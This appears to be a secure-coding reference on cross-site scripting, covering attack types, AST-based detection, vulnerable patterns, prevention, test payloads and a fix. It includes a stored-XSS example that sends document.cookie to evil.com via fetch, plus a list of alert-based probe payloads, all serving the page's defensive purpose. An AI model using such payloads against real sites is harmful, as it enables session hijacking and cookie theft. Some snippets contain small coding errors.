# Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing execution of malicious scripts in the victim's browser.

---

## Severity

**HIGH** - Can lead to session hijacking, defacement, redirection, or malware distribution.

---

## Types of XSS

### 1. Reflected XSS

```
ATTACK FLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Attacker crafts malicious URL:
   https://example.com/search?q=<script>stealCookies()</script>

2. Victim clicks link

3. Server reflects input in response:
   <p>Results for: <script>stealCookies()</script></p>

4. Browser executes script
   → Cookies stolen
   → Session hijacked
```

### 2. Stored XSS

```
ATTACK FLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Attacker submits malicious script:
   Comment: <script>fetch('https://evil.com?c='+document.cookie)</script>

2. Server stores comment in database

3. Victim views page containing comment

4. Script executes automatically
   → Persistent compromise
   → Affects all visitors
```

### 3. DOM-based XSS

```
ATTACK FLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Attacker crafts URL:
   https://example.com/#<img src=x onerror=alert(1)>

2. Victim visits URL

3. JavaScript reads URL fragment:
   const hash = location.hash;
   document.write(hash);

4. Script executes in victim's browser
   → No server involvement
```

---

## Detection

### AST Patterns to Detect

```typescript
const xssPatterns = {
  // Dangerous DOM manipulations
  dangerousSinks: [
    'innerHTML',
    'outerHTML',
    'insertAdjacentHTML',
    'document.write',
    'eval',
    'setTimeout',
    'setInterval',
  ],

  // Check for unsanitized user input in these
  check: (node: Node) => {
    // innerHTML = userInput
    if (isAssignment(node, 'innerHTML') && hasUserInput(node.right)) {
      return { vulnerable: true, sink: 'innerHTML' };
    }

    // document.write(userInput)
    if (isCall(node, 'document.write') && hasUserInput(node.arguments[0])) {
      return { vulnerable: true, sink: 'document.write' };
    }

    // eval(userInput)
    if (isCall(node, 'eval') && hasUserInput(node.arguments[0])) {
      return { vulnerable: true, sink: 'eval' };
    }
  },
};
```

### Common Vulnerable Patterns

```typescript
// VULNERABLE - AVOID:

// 1. innerHTML with user input
element.innerHTML = userInput;

// 2. document.write
document.write('<div>' + userInput + '</div>');

// 3. eval
eval('var name = "' + userInput + '"');

// 4. setTimeout/setInterval
setTimeout('alert("' + userInput + '")', 100);

// 5. React dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

---

## Prevention

### 1. Context-Aware Output Encoding

```typescript
// GOOD - Framework handles encoding
// React (automatic)
<div>{userInput}</div>

// Vue
<div>{{ userInput }}</div>

// Angular
<div [innerText]="userInput"></div>
```

### 2. Safe APIs

```typescript
// GOOD - Use safe APIs

// Instead of innerHTML:
element.textContent = userInput;  // Safe
element.innerText = userInput;    // Safe

// Instead of document.write:
element.createElement('div');
element.textContent = userInput;

// Instead of eval:
JSON.parse(userInput);  // If parsing JSON
```

### 3. Content Security Policy

```javascript
// HTTP Header
Content-Security-Policy: default-src 'self'; script-src 'self'

// Meta tag
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

### 4. Input Validation

```typescript
// Validate input type and format
const UserInputSchema = z.object({
  username: z.string().min(1).max(50).regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email(),
});

// Sanitize HTML (if needed)
import DOMPurify from 'dompurify';

const sanitize = (dirty: string): string => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: [],
  });
};
```

### 5. React-specific

```typescript
// BAD
<div dangerouslySetInnerHTML={{__html: userInput}} />

// GOOD
<div>{userInput}</div>

// If you MUST use HTML:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />
```

---

## Testing

### Manual Testing

```
XSS TEST PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Basic Script Tag
   <script>alert(1)</script>

2. Image onError
   <img src=x onerror=alert(1)>

3. SVG
   <svg onload=alert(1)>

4. Body onLoad
   <body onload=alert(1)>

5. JavaScript Protocol
   javascript:alert(1)

6. Encoded variants
   &lt;script&gt;alert(1)&lt;/script&gt;
   <script>alert(String.fromCharCode(49))</script>

7. DOM-based
   #<img src=x onerror=alert(1)>
```

### Automated Testing

```typescript
import { test, expect } from '@playwright/test';

test('XSS prevention', async ({ page }) => {
  const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
  ];

  for (const payload of payloads) {
    await page.goto(`/search?q=${encodeURIComponent(payload)}`);
    await page.waitForTimeout(1000);

    // Check alert didn't fire
    page.on('dialog', () => {
      throw new Error('XSS vulnerability detected!');
    });
  }
});
```

---

## Fix Example

```
BEFORE (Vulnerable):
━━━━━━━━━━━━━━━━━━━━

function renderComment(comment) {
  const div = document.createElement('div');
  div.innerHTML = comment.content;
  document.getElementById('comments').appendChild(div);
}

AFTER (Fixed):
━━━━━━━━━━━━━━━━

import DOMPurify from 'dompurify';

function renderComment(comment) {
  const div = document.createElement('div');
  div.textContent = comment.content;  // Safe!
  document.getElementById('comments').appendChild(div);
}

// OR with HTML (if needed):
function renderCommentHTML(comment) {
  const div = document.createElement('div');
  div.innerHTML = DOMPurify.sanitize(comment.content);
  document.getElementById('comments').appendChild(div);
}
```

---

## Related Vulnerabilities

- [DOM-based Vulnerabilities](./dom-vulnerabilities.md)
- [CSRF](./csrf.md) - Often used together with XSS

---

*Document version: 1.0*
*Last updated: 2026-03-04*
